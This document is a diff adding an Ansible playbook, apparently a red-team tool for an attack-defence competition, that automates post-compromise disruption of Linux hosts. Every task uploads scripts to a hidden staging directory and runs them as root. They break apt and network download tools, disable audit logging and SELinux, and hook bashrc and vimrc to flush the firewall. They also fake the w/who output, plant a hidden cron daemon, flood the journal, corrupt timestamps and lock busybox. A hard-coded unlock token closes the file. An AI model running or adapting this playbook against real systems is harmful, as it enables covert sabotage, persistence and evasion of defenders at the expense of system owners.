@@ -1,0 +1,216 @@
+---
+# Phase 4 — Disruption
+# ─────────────────────────────────────────────────────────────────────────────
+# IMPORTANT: Do NOT run this until persistence is confirmed on the target.
+#            If you disrupt before you have a stable backdoor, you may
+#            lock yourself out along with the blue team.
+#
+# Run on single host:  ansible-playbook playbooks/02_disrupt.yml -l svc-ftp-01
+# Run on all linux:    ansible-playbook playbooks/02_disrupt.yml -l linux
+# Light only:          ansible-playbook playbooks/02_disrupt.yml -l linux --tags disrupt
+# Heavy only:          ansible-playbook playbooks/02_disrupt.yml -l linux --tags heavy
+# ─────────────────────────────────────────────────────────────────────────────
+
+- name: Disruption — light phase
+  hosts: linux
+  gather_facts: false
+  become: true
+  vars:
+    scripts_src: "{{ playbook_dir }}/../../odessa"
+    staging: /tmp/.pkgcache
+
+  tags: [disrupt]
+
+  tasks:
+    - name: Create staging directory
+      file:
+        path: "{{ staging }}"
+        state: directory
+        mode: "0700"
+
+    # ── Upload all scripts ────────────────────────────────────────────────────
+    - name: Upload disruption scripts
+      copy:
+        src: "{{ scripts_src }}/{{ item }}"
+        dest: "{{ staging }}/{{ item | basename }}"
+        mode: "0700"
+      loop:
+        - no-apt.sh
+        - break-net-tools.sh
+        - no-audit.sh
+        - no-selinux.sh
+        - alias-bashrc.sh
+        - vim-persist.sh
+        - compromise-w-who.sh
+        - vandalize-bashrc.sh
+        - shadow-crond.sh
+
+    # ── 1. no-apt — FIRST: stops blue team installing tools ───────────────────
+    - name: "[1/8] Break apt"
+      command: bash {{ staging }}/no-apt.sh install
+      args:
+        chdir: "{{ staging }}"
+      register: no_apt
+      changed_when: true
+      failed_when: false
+
+    - name: "[1/8] Result"
+      debug:
+        msg: "{{ no_apt.stdout_lines | default([]) + no_apt.stderr_lines | default([]) }}"
+
+    # ── 2. break-net-tools — SECOND: blocks curl/wget/git downloads ───────────
+    - name: "[2/8] Break net tools"
+      command: bash {{ staging }}/break-net-tools.sh install
+      args:
+        chdir: "{{ staging }}"
+      register: no_net
+      changed_when: true
+      failed_when: false
+
+    - name: "[2/8] Result"
+      debug:
+        msg: "{{ no_net.stdout_lines | default([]) + no_net.stderr_lines | default([]) }}"
+
+    # ── 3. no-audit — THIRD: blind audit logging before making more noise ─────
+    - name: "[3/8] Kill audit logging"
+      command: bash {{ staging }}/no-audit.sh
+      args:
+        chdir: "{{ staging }}"
+      register: no_audit
+      changed_when: true
+      failed_when: false
+
+    - name: "[3/8] Result"
+      debug:
+        msg: "{{ no_audit.stdout_lines | default([]) + no_audit.stderr_lines | default([]) }}"
+
+    # ── 4. no-selinux — FOURTH: disable MAC enforcement ──────────────────────
+    - name: "[4/8] Disable SELinux"
+      command: bash {{ staging }}/no-selinux.sh
+      args:
+        chdir: "{{ staging }}"
+      register: no_sel
+      changed_when: true
+      failed_when: false
+
+    - name: "[4/8] Result"
+      debug:
+        msg: "{{ no_sel.stdout_lines | default([]) + no_sel.stderr_lines | default([]) }}"
+
+    # ── 5. alias-bashrc — fw flush on every sudo ─────────────────────────────
+    - name: "[5/8] Inject bashrc alias (sudo fw flush)"
+      command: bash {{ staging }}/alias-bashrc.sh
+      args:
+        chdir: "{{ staging }}"
+      register: alias_rc
+      changed_when: true
+      failed_when: false
+
+    - name: "[5/8] Result"
+      debug:
+        msg: "{{ alias_rc.stdout_lines | default([]) + alias_rc.stderr_lines | default([]) }}"
+
+    # ── 6. vim-persist — fw flush on every vim open ──────────────────────────
+    - name: "[6/8] Inject vimrc (fw flush on open)"
+      command: bash {{ staging }}/vim-persist.sh
+      args:
+        chdir: "{{ staging }}"
+      register: vim_rc
+      changed_when: true
+      failed_when: false
+
+    - name: "[6/8] Result"
+      debug:
+        msg: "{{ vim_rc.stdout_lines | default([]) + vim_rc.stderr_lines | default([]) }}"
+
+    # ── 7. compromise-w-who — fake session output ────────────────────────────
+    - name: "[7/8] Fake w/who binaries"
+      command: bash {{ staging }}/compromise-w-who.sh
+      args:
+        chdir: "{{ staging }}"
+      register: who_out
+      changed_when: true
+      failed_when: false
+
+    - name: "[7/8] Result"
+      debug:
+        msg: "{{ who_out.stdout_lines | default([]) + who_out.stderr_lines | default([]) }}"
+
+    # ── 8. shadow-crond — hidden cron daemon (before lock-busybox) ───────────
+    - name: "[8/8] Deploy shadow crond"
+      command: bash {{ staging }}/shadow-crond.sh install
+      args:
+        chdir: "{{ staging }}"
+      register: shadow_crond
+      changed_when: true
+      failed_when: false
+
+    - name: "[8/8] Result"
+      debug:
+        msg: "{{ shadow_crond.stdout_lines | default([]) + shadow_crond.stderr_lines | default([]) }}"
+
+    - name: Disrupt phase complete on {{ inventory_hostname }}
+      debug:
+        msg: "Light disruption done. Verify persistence still works before running --tags heavy."
+
+# ─────────────────────────────────────────────────────────────────────────────
+- name: Disruption — heavy phase (noisy / semi-irreversible for the match)
+  hosts: linux
+  gather_facts: false
+  become: true
+  vars:
+    scripts_src: "{{ playbook_dir }}/../../odessa"
+    staging: /tmp/.pkgcache
+
+  tags: [heavy]
+
+  tasks:
+    - name: Upload heavy scripts
+      copy:
+        src: "{{ scripts_src }}/{{ item }}"
+        dest: "{{ staging }}/{{ item | basename }}"
+        mode: "0700"
+      loop:
+        - flood-journal.sh
+        - the-toucher.sh
+        - lock-busybox.sh
+
+    # ── flood-journal — log flooding (very noisy, run late) ──────────────────
+    - name: "[H1/3] Flood journald"
+      command: bash {{ staging }}/flood-journal.sh install
+      args:
+        chdir: "{{ staging }}"
+      register: flood_j
+      changed_when: true
+      failed_when: false
+      async: 10
+      poll: 0
+
+    - name: "[H1/3] Flood journal launched in background"
+      debug:
+        msg: "flood-journal.sh daemonized — workers now running on {{ inventory_hostname }}"
+
+    # ── the-toucher — corrupt timestamps (background, ongoing) ───────────────
+    - name: "[H2/3] Launch the-toucher in background"
+      shell: nohup bash {{ staging }}/the-toucher.sh &>/dev/null &
+      args:
+        chdir: "{{ staging }}"
+      changed_when: true
+      failed_when: false
+
+    # ── lock-busybox — gate busybox LAST, after shadow-crond is running ───────
+    - name: "[H3/3] Lock busybox"
+      command: bash {{ staging }}/lock-busybox.sh install
+      args:
+        chdir: "{{ staging }}"
+      register: lock_bb
+      changed_when: true
+      failed_when: false
+
+    - name: "[H3/3] Result"
+      debug:
+        msg: "{{ lock_bb.stdout_lines | default([]) + lock_bb.stderr_lines | default([]) }}"
+
+    - name: Heavy phase complete on {{ inventory_hostname }}
+      debug:
+        msg: "Token to unlock busybox: RT_TOK=rt2025!delta — do not lose this"
